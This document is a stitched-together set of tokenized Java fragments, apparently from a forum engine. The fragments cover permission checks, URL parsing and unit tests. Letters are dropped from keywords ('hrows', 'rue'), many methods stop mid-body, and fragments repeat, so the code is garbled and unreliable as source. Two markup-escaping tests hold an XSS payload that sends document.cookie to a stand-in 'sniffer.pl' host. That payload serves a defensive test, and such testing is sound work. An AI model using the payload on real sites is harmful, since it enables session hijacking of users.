public UserEvent mapRow ( ResultSet resultSet , int i ) hrows SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; EventType ype = EventType . valueOf ( resultSet . getString ( " ype " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupTitle , groupUrlName , sectionId , subj , lastmod , msgid , ype , eventMessage , eventDate , unread ) ; 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public boolean isEditable ( User by ) { return TopicPermissionService . isEditable ( his , by ) ; } 
public boolean isCommentsAllowed ( User user ) { return TopicPermissionService . isCommentsAllowed ( message , user ) ; } 
public static boolean isCommentsAllowed ( Topic opic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) ) { return false ; } int score = opic . getPostScore ( ) ; if ( score = = Topic . POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = Topic . POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = Topic . POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = Topic . POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public boolean isDeletableByUser ( Topic opic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( opic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & opic . getUid ( ) = = user . getId ( ) ) ; } 
public boolean isCommentsAllowed ( ) { return commentsAllowed ; } 
public boolean isCommentsAllowed ( Topic opic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) ) { return false ; } int score = opic . getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure ) ; TopicMenu opicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public String handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { response . setStatus ( HttpServletResponse . SC_FORBIDDEN ) ; return " error-user-banned " ; } 
public String handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { return " error-user-banned " ; } 
protected void findURLIds ( ) hrows URIException { if ( _true_lor_url ) { find message id in lor url 
public String oString ( ) { return getEscapedURIReference ( ) ; } 
public String oUnEscapedString ( ) { ry { return getURIReference ( ) ; 
public boolean isTrueLorUrl ( ) { return _true_lor_url ; } 
public boolean isMessageUrl ( ) { return _topic_id ! = - 1 ; } 
public boolean isCommentUrl ( ) { return _comment_id ! = - 1 ; } 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = getURIReference ( ) ; String scheme = getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( _true_lor_url ) { if ( uriWithoutScheme . length ( ) < maxLength ) { 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! _true_lor_url ) { return oString ( ) ; } String host = getHost ( ) ; int port = getPort ( ) ; String path = getPath ( ) ; String query = getQuery ( ) ; String fragment = getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
public String formatJump ( TopicDao messageDao , boolean secure ) hrows MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = null ; ry { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { hrow new RuntimeException ( " Invalid group id msgid= " + _topic_id , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = getHost ( ) ; int port = getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public static boolean isUnsignedPositiveNumber ( String s ) { return s . matches ( " \\ d+ " ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { ry { LorURL lorCutURL = new LorURL ( configuration . getMainURI ( ) , cutURL ) ; if ( lorCutURL . isTrueLorUrl ( ) ) { URI fixURI = new URI ( lorCutURL . fixScheme ( secure ) , rue , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; return rootNode ; } 
private void processMessageUrl ( boolean secure , StringBuilder out , LorURL url ) hrows URIException { ry { Topic message = messageDao . getById ( url . getMessageId ( ) ) ; 
public void est1 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486#comment-6753612 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est1n ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est2 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est3 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est4 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url4 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est5 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url5 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est6 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url6 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( rue ) ) ; } 
public void est7 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url7 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( rue ) ) ; } 
public void est8 ( ) hrows Exception { boolean result = false ; ry { LorURL lorURI = new LorURL ( mainURI , failurl8 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est9 ( ) hrows Exception { boolean result = false ; ry { LorURL lorURI = new LorURL ( mainURI , failurl9 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est10 ( ) hrows Exception { boolean result = false ; ry { LorURL lorURI = new LorURL ( mainURI , failurl10 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void est11 ( ) hrows Exception { boolean result = false ; ry { LorURL lorURI = new LorURL ( mainURI , failurl11 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void est12 ( ) hrows Exception { LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est13 ( ) hrows Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURL lorURI1 = new LorURL ( mainLORURI , url13_1 ) ; LorURL lorURI2 = new LorURL ( mainLORURI , url13_2 ) ; LorURL lorURI3 = new LorURL ( mainLORURI , url13_3 ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c++ " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20%20 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " http:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/view-news.jsp?tag=c%20c " , lorURI3 . fixScheme ( rue ) ) ; } 
public void est14 ( ) hrows Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public void est15 ( ) hrows Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false ) ) ; assertEquals ( RESULT14 , oHtmlFormatter . format ( TEXT14 , false ) ) ; assertEquals ( RESULT15 , oHtmlFormatter . format ( TEXT15 , false ) ) ; assertEquals ( RESULT16 , oHtmlFormatter . format ( TEXT16 , false ) ) ; assertEquals ( RESULT17 , oHtmlFormatter . format ( TEXT17 , false ) ) ; assertEquals ( RESULT17_2 , oHtmlFormatter . format ( TEXT17_2 , false ) ) ; assertEquals ( RESULT18 , oHtmlFormatter . format ( TEXT18 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public ModelAndView handleUserBanedException ( UserBanedException ex , HttpServletRequest request , HttpServletResponse response ) { return new ModelAndView ( " error-user-banned " , " exception " , ex ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false ) ) ; Assert . assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false ) ) ; 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com']example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com]example[/url] " , false ) ) ; 
public String prepareCommentText ( int id , final boolean secure ) { MessageText messageText = msgbaseDao . getMessageText ( id ) ; if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , secure ) ; 
public String prepareCommentTextRSS ( int id , final boolean secure ) { MessageText messageText = msgbaseDao . getMessageText ( id ) ; if ( messageText . isLorcode ( ) ) { return lorCodeService . parseCommentRSS ( messageText . getText ( ) , secure ) ; 
public MessageText mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean lorcode = resultSet . getBoolean ( " bbcode " ) ; return new MessageText ( ext , lorcode ) ; } 
private void updateMessage ( Topic opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
public String prepareCommentTextRSS ( int id , final boolean secure ) { MessageText messageText = msgbaseDao . getMessageText ( id ) ; return lorCodeService . prepareTextRSS ( messageText . getText ( ) , secure , messageText . isLorcode ( ) ) ; } 
public void updateMessage ( int msgid , String ext ) { namedJdbcTemplate . update ( " UPDATE msgbase SET message=:message WHERE id=:msgid " , 
public static EditInfoDto createFromMessage ( TagDao agDao , Topic message , String ext ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( ext ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . oString ( agDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public PreparedTopic prepareTopicForView ( Topic message , boolean minimizeCut , boolean secure , User user ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , user , null ) ; } 
public PreparedTopic prepareMessage ( Topic message , boolean minimizeCut , boolean secure ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure , null ) ; } 
public PreparedTopic prepareMessage ( Topic message , List < String > ags , PreparedPoll newPoll , boolean secure , String ext ) { return prepareMessage ( message , ags , false , newPoll , secure , ext ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , String ext ) { return prepareMessage ( message , ags , minimizeCut , poll , secure , null , ext ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure , User user , String ext ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure , null ) ; TopicMenu opicMenu = getMessageMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
